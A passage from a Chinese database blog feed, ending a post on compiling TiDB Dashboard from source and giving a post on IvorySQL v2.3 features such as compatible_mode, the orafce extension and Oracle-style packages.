17.0.2</span><br><span class="line">  ├─┬ its-fine 1.0.6</span><br><span class="line">  │ └── ✕ unmet peer react@&gt;=18.0: found 17.0.2</span><br><span class="line">  └─┬ react-reconciler 0.27.0</span><br><span class="line">    └── ✕ unmet peer react@^18.0.0: found 17.0.2</span><br><span class="line"></span><br><span class="line">The integrity of 1189 files was checked. This might have caused installation to take longer.</span><br><span class="line">Done in 6m 53.8s</span><br><span class="line">cd ui &amp;&amp;\</span><br><span class="line">pnpm build</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">tidb-dashboard-ui@1.0.0 build /home/shawnyan/tidb-dashboard-master/ui</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">pnpm -r build</span></span><br><span class="line"></span><br><span class="line">packages/tidb-dashboard-lib              |  WARN  The field &quot;resolutions&quot; was found in /home/shawnyan/tidb-dashboard-master/ui/packages/tidb-dashboard-lib/package.json. This will not take effect. You should configure &quot;resolutions&quot; at the root of the workspace instead.</span><br><span class="line">Scope: 7 of 8 workspace projects</span><br><span class="line">packages/clinic-client build$ gulp build</span><br><span class="line">[28 lines collapsed]</span><br><span class="line">│ [main] INFO  o.o.codegen.TemplateManager - writing file /home/shawnyan/tidb-dashboard-master/ui/packages/clinic-client/src/client/api/.openapi-generator/FILES</span><br><span class="line">│ ################################################################################</span><br><span class="line">│ # Thanks for using OpenAPI Generator.                                          #</span><br><span class="line">│ # Please consider donation to help us maintain this project 🙏                 ##</span><br><span class="line">│ # https://opencollective.com/openapi_generator/donate                          #</span><br><span class="line">│ ################################################################################</span><br><span class="line">│ [17:37:00] Finished &#x27;swagger:gen&#x27; after 45 min</span><br><span class="line">│ [17:37:00] Starting &#x27;tsc:build&#x27;...</span><br><span class="line">│ [17:37:14] Finished &#x27;tsc:build&#x27; after 14 s</span><br><span class="line">│ [17:37:14] Finished &#x27;build&#x27; after 45 min</span><br><span class="line">└─ Done in 45m 36.6s</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>Finally, TiDB Dashboard 编译完成。这里演示的是直接将 TiDB Dashboard 直接编译为二进制文件，所以编译完成后，可以在 <code>bin</code> 目录下看到 <code>tidb-dashboard</code> 二进制包。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 bin]$ ./tidb-dashboard --help</span><br><span class="line">Usage of ./tidb-dashboard:</span><br><span class="line">      --cluster-allowed-names string   comma-delimited list of acceptable peer certificate SAN identities</span><br><span class="line">      --cluster-ca string              (TLS between components of the TiDB cluster) path of file that contains list of trusted SSL CAs</span><br><span class="line">      --cluster-cert string            (TLS between components of the TiDB cluster) path of file that contains X509 certificate in PEM format</span><br><span class="line">      --cluster-key string             (TLS between components of the TiDB cluster) path of file that contains X509 key in PEM format</span><br><span class="line">      --data-dir string                path to the Dashboard Server data directory (default &quot;/tmp/dashboard-data&quot;)</span><br><span class="line">  -d, --debug                          enable debug logs</span><br><span class="line">      --experimental                   allow experimental features</span><br><span class="line">      --feature-version string         target TiDB version for standalone mode (default &quot;N/A&quot;)</span><br><span class="line">  -h, --host string                    listen host of the Dashboard Server (default &quot;127.0.0.1&quot;)</span><br><span class="line">      --path-prefix string             public URL path prefix for reverse proxies (default &quot;/dashboard&quot;)</span><br><span class="line">      --pd string                      PD endpoint address that Dashboard Server connects to (default &quot;http://127.0.0.1:2379&quot;)</span><br><span class="line">  -p, --port int                       listen port of the Dashboard Server (default 12333)</span><br><span class="line">      --telemetry                      allow telemetry</span><br><span class="line">      --temp-dir string                path to the Dashboard Server temporary directory, used to store the searched logs</span><br><span class="line">      --tidb-allowed-names string      comma-delimited list of acceptable peer certificate SAN identities</span><br><span class="line">      --tidb-ca string                 (TLS for MySQL client) path of file that contains list of trusted SSL CAs</span><br><span class="line">      --tidb-cert string               (TLS for MySQL client) path of file that contains X509 certificate in PEM format</span><br><span class="line">      --tidb-key string                (TLS for MySQL client) path of file that contains X509 key in PEM format</span><br><span class="line">  -v, --version                        print version information and exit</span><br><span class="line">pflag: help requested</span><br></pre></td></tr></table></figure></div>
<p>此时，可以单独启动面板，只需将其注册到 PD。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./bin/tidb-dashboard --pd x.x.x.x</span><br></pre></td></tr></table></figure></div>
<p>新启动的面板默认端口为 <code>12333</code>，可以通过 URL <a class="link"   href="http://127.0.0.1:12333/dashboard/" >http://127.0.0.1:12333/dashboard/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来访问刚刚编译好的面板。</p>
<h2 id="验证测试">验证测试</h2>
<p>为了验证编译效果，本例中对 TiDB Dashboard 做了小小改动，版本号增加了 <code>-ShawnYan</code> 后缀，在【概况】、【监控指标】页面有文档链接，实际产品中指向了 <code>stable</code> 版本，这里修改为 <code>v7.2</code>。</p>
<img  alt="t2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2-1690947491356.png"
                      referrerpolicy="no-referrer"
                >
<p>修改的代码位置为：<br>
<a class="link"   href="https://github.com/pingcap/tidb-dashboard/blob/master/ui/packages/tidb-dashboard-for-op/src/apps/Overview/context.ts#L60" >https://github.com/pingcap/tidb-dashboard/blob/master/ui/packages/tidb-dashboard-for-op/src/apps/Overview/context.ts#L60 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://github.com/pingcap/tidb-dashboard/blob/master/ui/packages/tidb-dashboard-for-op/src/apps/Monitoring/context.ts#L36" >https://github.com/pingcap/tidb-dashboard/blob/master/ui/packages/tidb-dashboard-for-op/src/apps/Monitoring/context.ts#L36 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>修改完成后，再次打包。待打包完成后启动 TiDB Dashboard。可以看到如下效果：</p>
<img  alt="t3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3-1690947496287.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>在 CentOS 7 下就可以进行编译，并不需要高版本的 gcc，体验就很棒，但是还是对机器的性能是有要求的，“老破小”机器上编译就很痛苦。<br>
在写本文过程中，发现 TiDB Dashboard 和 PD 的版本未对齐，于是在 <a class="link"   href="https://asktug.com/" >AskTUG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上开了一个帖子 (<a class="link"   href="https://asktug.com/t/topic/1010558" >1010558 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) ，从帖子提出到问题有人对应，产研在源码仓库提出 Issue <a class="link"   href="https://github.com/pingcap/tidb-dashboard/issues/1566" >#1566 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 仅过去了不到一小时，对应速度可谓飞快。 Surprise!<br>
另发现一处文档选择 dev 版本的小问题，也提了帖子记录一下。(<a class="link"   href="https://asktug.com/t/topic/1010580" >1010580 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>
anyway, TiDB 组件很多，而编译工作是定制化二次开发的一个必要条件，要想一个一个编译过来还需要花点时间和精力。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>compile</tag>
        <tag>tidb 7.x</tag>
        <tag>pd</tag>
        <tag>dashboard</tag>
      </tags>
  </entry>
  <entry>
    <title>象牙数据库 IvorySQL v2.3 特性浅析</title>
    <url>/2023/postgresql/ivorysql-v2.3-feature/</url>
    <content><![CDATA[<img  alt="ivorysql-logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220419-f0ca4139-24ab-4ec2-b9c4-02b613d5b6ea.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="引言">引言</h2>
<p>第一次接触到 IvorySQL 数据库是在编写 <a href="https://shawnyan.cn/2022/modb/modb-2022-05-db-ranking/">2022年5月中国数据库排行榜：openGauss 黑马首登顶，AntDB 冲进20强</a> 的时候，那时候 IvorySQL 刚上榜，时隔一年多，IvorySQL 的排名已上升不少，更是在最近发布的 <a class="link"   href="https://www.modb.pro/db/1684384461898194944" >2023开源数据库排行 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中，跻身三十强。过去一年，IvorySQL 在 Github 上的源码仓库 Star 数，从 90 上升到今天的 560，真的很棒！</p>
<img  alt="ivorysqlstar.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-130c1a7c-5840-4f6b-9210-ff93f65f8359.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="象牙数据库-IvorySQL">象牙数据库 IvorySQL</h2>
<p>IvorySQL (Ivory 译为，象牙) 是由瀚高 (Highgo) 发起的基于 PostgreSQL 的衍生开源项目，采用 Apache-2.0 license，100% 兼容原生 PostgreSQL。IvorySQL 导入并增强了 Orafce 扩展插件，以此支持、兼容 Oracle 的诸多特性，如 PACKAGE、数据类型、转换函数等。IvorySQL 增加了 <code>compatible_mode</code> 开关，可以切换 PostgreSQL 和 Oracle 兼容模式。在 Oracle 兼容性方面，IvorySQL 还增加了独有的 PL/iSQL 过程语言，以此来支持 Oracle 的 PL/SQL 语法和 Oracle 风格的 PACKAGES。在即将发布的 IvorySQL v3.0 中，将支持双端口，即端口 5333 用于 IvorySQL 连接，端口 1521 用于 Oracle 模式连接。</p>
<p>2021 年 12 月 15 日，发布了 IvorySQL 的第一个版本。今年 6 月 28 日，发布了 IvorySQL 2.3，下图为目前 IvorySQL 的发布时间线。</p>
<img  alt="ivorysql-timeline.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-7e6a94e8-b912-4cd1-a0d2-c7477980d293.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="IvorySQL-源码编译">IvorySQL 源码编译</h2>
<p>IvorySQL v2.3 是基于 PostgreSQL 15.3 开发的，所以 IvorySQL 编译过程大致与 PG 15 类似，前段时间写过一篇 PG 15 源码编译的文章 <a href="https://shawnyan.cn/2023/postgresql/pg-15-compile-with-dockerfile/">《【PG15】【番外篇】自定义 Dockerfile 构建 PostgreSQL 15 编译版 Docker 镜像》</a> ，这里只再强调一下区别，详细过程不再复述。</p>
<ol>
<li>下载 IvorySQL 2.3 的源码包</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/IvorySQL/IvorySQL/archive/refs/tags/Ivory_REL_$PG_VERSION.tar.gz</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>IvorySQL 的默认监听端口为 5333，以区别于 PostgreSQL 的 5432。服务启动后，在日志文件中可看到监听端口，或直接查看 postgres 进程的端口也可以看到 5333。</li>
</ol>
<img  alt="ivory5333.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-d3ebcfd3-2804-4552-b05f-fb5845eb604b.png"
                      referrerpolicy="no-referrer"
                >
<ol start="3">
<li>
<p>源码包 (<code>Ivory_REL_2_3.tar.gz</code>) 和解压后的文件夹 (<code>IvorySQL-Ivory_REL_2_3</code>) 名称不一致，在编译过程中需要注意一下，希望官方可以将命名统一。(<a class="link"   href="https://github.com/IvorySQL/IvorySQL/issues/332" >IvorySQL#332 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
</li>
<li>
<p>IvorySQL 编译时，使用命令 <code>make</code> 会将所有 contrib 扩展进行编译，而在 PostgreSQL 中需要使用 <code>make world</code> 才可以。</p>
</li>
<li>
<p>IvorySQL 编译时，会默认将扩展插件 orafce 也进行编译，并在 IvorySQL 启动时默认 enable （1.x 是没有问题的，2.x 暂不会自动加载）。(<a class="link"   href="https://github.com/IvorySQL/IvorySQL/issues/183" >IvorySQL#183 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
</li>
</ol>
<h2 id="IvorySQL-特性">IvorySQL 特性</h2>
<h3 id="IvorySQL-数据库">IvorySQL 数据库</h3>
<p>IvorySQL 编译后，便可初始化数据库，并启动数据库。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">initdb --pgdata=$PGDATA</span><br><span class="line">pg_ctl -D $PGDATA -l logfile start</span><br></pre></td></tr></table></figure></div>
<p>启动后，分别查看版本，用户，数据库，模式，扩展，兼容模式信息。</p>
<img  alt="ivoryversion.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-4c1d579e-6898-4df1-8642-70fdcb7d9c8d.png"
                      referrerpolicy="no-referrer"
                >
<p>可以看到，IvorySQL 数据库已默认创建超级用户 <code>ivorysql</code>，并以 <code>template1</code> 为模板创建数据库 <code>ivorysql</code>。</p>
<h3 id="IvorySQL-表-pg-catalog-pg-proc-新增字段-proaccess">IvorySQL: 表 <code>pg_catalog.pg_proc</code> 新增字段 <code>proaccess</code></h3>
<p>对比 IvorySQL v2.3 和 PostgreSQL v15.2 可以发现，在 IvorySQL 中，表 <code>pg_catalog.pg_proc</code> 增加了一个字段 <code>proaccess</code>。</p>
<ul>
<li>IvorySQL</li>
</ul>
<img  alt="ivorydiffproc.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-6d3c0a5e-d1f9-41d8-997b-d089bca17d61.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>PostgreSQL</li>
</ul>
<img  alt="ivorydiffprocpg.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-d66b0c69-3354-49ae-9926-7061775fa595.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="IvorySQL-新增表-pg-catalog-pg-variable">IvorySQL: 新增表 <code>pg_catalog.pg_variable</code></h3>
<p>在 IvorySQL 中新增表 <code>pg_catalog.pg_variable</code>，这在 PostgreSQL 中是没有的。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">postgres<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pg_catalog.pg_variable;</span><br><span class="line">ERROR:  relation &quot;pg_catalog.pg_variable&quot; does <span class="keyword">not</span> exist</span><br><span class="line">LINE <span class="number">1</span>: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pg_catalog.pg_variable;</span><br></pre></td></tr></table></figure></div>
<p>表结构如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># \d<span class="operator">+</span> pg_catalog.pg_variable</span><br><span class="line">                                            <span class="keyword">Table</span> &quot;pg_catalog.pg_variable&quot;</span><br><span class="line">     <span class="keyword">Column</span>     <span class="operator">|</span>     Type     <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> Nullable <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Storage  <span class="operator">|</span> Compression <span class="operator">|</span> Stats target <span class="operator">|</span> Description</span><br><span class="line"><span class="comment">----------------+--------------+-----------+----------+---------+----------+-------------+--------------+-------------</span></span><br><span class="line">oid            <span class="operator">|</span> oid          <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varname        <span class="operator">|</span> name         <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varnamespace   <span class="operator">|</span> oid          <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">vartype        <span class="operator">|</span> oid          <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">vartypmod      <span class="operator">|</span> <span class="type">integer</span>      <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varowner       <span class="operator">|</span> oid          <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varcollation   <span class="operator">|</span> oid          <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varisnotnull   <span class="operator">|</span> <span class="type">boolean</span>      <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varisimmutable <span class="operator">|</span> <span class="type">boolean</span>      <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">vareoxaction   <span class="operator">|</span> &quot;char&quot;       <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">vardefexpr     <span class="operator">|</span> pg_node_tree <span class="operator">|</span> C         <span class="operator">|</span>          <span class="operator">|</span>         <span class="operator">|</span> extended <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varacl         <span class="operator">|</span> aclitem[]    <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span>         <span class="operator">|</span> extended <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">varaccess      <span class="operator">|</span> &quot;char&quot;       <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>             <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line">Indexes:</span><br><span class="line">    &quot;pg_variable_oid_index&quot; <span class="keyword">PRIMARY</span> KEY, btree (oid)</span><br><span class="line">    &quot;pg_variable_varname_nsp_index&quot; <span class="keyword">UNIQUE</span> <span class="keyword">CONSTRAINT</span>, btree (varname, varnamespace)</span><br><span class="line">Access <span class="keyword">method</span>: heap</span><br></pre></td></tr></table></figure></div>
<h3 id="IvorySQL-兼容模式-compatible-mode">IvorySQL: 兼容模式 <code>compatible_mode</code></h3>
<p>IvorySQL 中增加了配置项 <code>compatible_mode</code> 用于选择兼容 PostgreSQL 模式还是 Oracle 模式，默认值为 <code>postgres</code>，配置方法：</p>
<ol>
<li>
<p>在初始化时，<code>initdb</code> 后接选项 <code>-c, --compatible-mode = oracle</code>，如果不指定，则默认使用 <code>postgres</code>。</p>
</li>
<li>
<p>可以在配置文件中进行修改：</p>
</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@centos7 data]$ grep mode postgresql.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">default configuration <span class="keyword">for</span> compatibility mode</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">compatible_mode = postgres             <span class="comment"># postgres, oracle</span></span></span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>也可以在会话中进行修改：</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">set</span> compatible_mode <span class="operator">=</span> <span class="string">&#x27;oracle&#x27;</span> ;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> compatible_mode ;</span><br><span class="line">compatible_mode</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">oracle</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="IvorySQL-orafce-扩展">IvorySQL: orafce 扩展</h3>
<p>前文提到 IvorySQL 通过支持、增强 orafce 扩展从而对 Oracle 进行兼容，但是在 IvorySQL 2.3 中，这个插件并非开箱即用，而是需要手动安装：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># \dx</span><br><span class="line">                 List <span class="keyword">of</span> installed extensions</span><br><span class="line">  Name   <span class="operator">|</span> Version <span class="operator">|</span>   Schema   <span class="operator">|</span>         Description</span><br><span class="line"><span class="comment">---------+---------+------------+------------------------------</span></span><br><span class="line"> plisql  <span class="operator">|</span> <span class="number">1.0</span>     <span class="operator">|</span> pg_catalog <span class="operator">|</span> PL<span class="operator">/</span>iSQL procedural <span class="keyword">language</span></span><br><span class="line"> plpgsql <span class="operator">|</span> <span class="number">1.0</span>     <span class="operator">|</span> pg_catalog <span class="operator">|</span> PL<span class="operator">/</span>pgSQL procedural <span class="keyword">language</span></span><br><span class="line">(<span class="number">2</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">CREATE</span> EXTENSION orafce;</span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION</span><br><span class="line">ivorysql<span class="operator">=</span>#</span><br><span class="line">ivorysql<span class="operator">=</span># \dx</span><br><span class="line">                                                  List <span class="keyword">of</span> installed extensions</span><br><span class="line">  Name   <span class="operator">|</span> Version <span class="operator">|</span>   Schema   <span class="operator">|</span>                                          Description</span><br><span class="line"><span class="comment">---------+---------+------------+-----------------------------------------------------------------------------------------------</span></span><br><span class="line"> orafce  <span class="operator">|</span> <span class="number">3.18</span>    <span class="operator">|</span> public     <span class="operator">|</span> Functions <span class="keyword">and</span> operators that emulate a <span class="keyword">subset</span> <span class="keyword">of</span> functions <span class="keyword">and</span> packages <span class="keyword">from</span> the Oracle RDBMS</span><br><span class="line"> plisql  <span class="operator">|</span> <span class="number">1.0</span>     <span class="operator">|</span> pg_catalog <span class="operator">|</span> PL<span class="operator">/</span>iSQL procedural <span class="keyword">language</span></span><br><span class="line"> plpgsql <span class="operator">|</span> <span class="number">1.0</span>     <span class="operator">|</span> pg_catalog <span class="operator">|</span> PL<span class="operator">/</span>pgSQL procedural <span class="keyword">language</span></span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<p>至于不能“开箱即用”的原因，则是因为一个 Bug，具体可参考 issue：<a class="link"   href="https://github.com/ivorySQL/ivorySQL/issues/183" >Initdb -c Oracle failed to load orafce automatically#183 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="IvorySQL-Oracle-兼容性-–-包-PACKAGE">IvorySQL: Oracle 兼容性 – 包 (PACKAGE)</h3>
<p>这个特性在文章 <a class="link"   href="https://www.modb.pro/db/411935" >IvorySQL功能点介绍–软件包 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中已经介绍地很详细了，这里需要强调的是，如果想要使用 PACKAGE，那么首先需要将兼容模式切换到 oracle，并且需要确认已经安装扩展 orafce。</p>
<p>这里借用文中的案例做以演示：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- create table</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> books (</span><br><span class="line">id <span class="type">INT</span>,</span><br><span class="line">title VARCHAR2(<span class="number">100</span>),</span><br><span class="line">author VARCHAR2(<span class="number">100</span>),</span><br><span class="line">price NUMBER);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- insert data</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> books <span class="keyword">VALUES</span> (<span class="number">10</span>, <span class="string">&#x27;The Hobbit&#x27;</span>, <span class="string">&#x27;J. R. R. Tolkien&#x27;</span>, <span class="number">10.0</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> books <span class="keyword">VALUES</span> (<span class="number">11</span>, <span class="string">&#x27;Winnie-the-Pooh&#x27;</span>, <span class="string">&#x27;A. A. Milne&#x27;</span>, <span class="number">5.0</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> books <span class="keyword">VALUES</span> (<span class="number">12</span>, <span class="string">&#x27;Peter Pan&#x27;</span>, <span class="string">&#x27;James Matthew Barrie&#x27;</span>, <span class="number">4.0</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> books <span class="keyword">VALUES</span> (<span class="number">13</span>, <span class="string">&#x27;Charlie and the Chocolate Factory&#x27;</span>, <span class="string">&#x27;Roald Dahl&#x27;</span>, <span class="number">5.0</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> books <span class="keyword">VALUES</span> (<span class="number">14</span>, <span class="string">&#x27;SThe Jungle Book&#x27;</span>, <span class="string">&#x27;Rudyard Kipling&#x27;</span>, <span class="number">9.0</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> books <span class="keyword">VALUES</span> (<span class="number">15</span>, <span class="string">&#x27;The Little White Bird&#x27;</span>, <span class="string">&#x27;James Matthew Barrie&#x27;</span>, <span class="number">3.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- create package</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE PACKAGE mybooks <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">CURSOR</span> booksinfo <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> BOOKS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">PROCEDURE</span> list_books;</span><br><span class="line"><span class="keyword">FUNCTION</span> add_book(title VARCHAR2(<span class="number">100</span>), author VARCHAR2(<span class="number">100</span>),</span><br><span class="line">price NUMBER) <span class="keyword">RETURN</span> bool;</span><br><span class="line"><span class="keyword">PROCEDURE</span> remove_book(book_title VARCHAR2(<span class="number">100</span>));</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure></div>
<img  alt="ivorydpkg.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-eb54f157-8d57-4523-843d-2470948351ab.png"
                      referrerpolicy="no-referrer"
                >
<p>BTW, 创建包时只能使用语法 <code>CREATE [OR REPLACE] PACKAGE</code>，目前尚不支持 <code>CREATE [IF NOT EXISTS] PACKAGE</code> 语法。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">drop</span> package if <span class="keyword">exists</span> mybooks;</span><br><span class="line">ERROR:  syntax error <span class="keyword">at</span> <span class="keyword">or</span> near &quot;exists&quot;</span><br><span class="line">LINE <span class="number">1</span>: <span class="keyword">drop</span> package if <span class="keyword">exists</span> mybooks;</span><br><span class="line">                        <span class="operator">^</span></span><br><span class="line">ivorysql<span class="operator">=</span>#</span><br></pre></td></tr></table></figure></div>
<h3 id="IvorySQL-元命令-dPKG">IvorySQL: 元命令 <code>\dPKG</code></h3>
<p>上图中已经演示 <code>\dPKG</code> 的用法，这个元命令是 IvorySQL 特有的，用来查看已经创建包的相关信息。</p>
<p>这里还有个小插曲，因为这条命令在官方文档中并无体现，所以翻了下源码，然后就发现了代码注释中的 typo，顺手提了个 <a class="link"   href="https://github.com/IvorySQL/IvorySQL/pull/331" >PR #331 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，不知是否会顺利 merge。(2023-07-28, PR 已经 merge，IvorySQL 研发响应蛮快 👍‍)</p>
<p>此外，关于 PACKAGE 的信息也可直接查询表 <code>pg_catalog.pg_package</code>。</p>
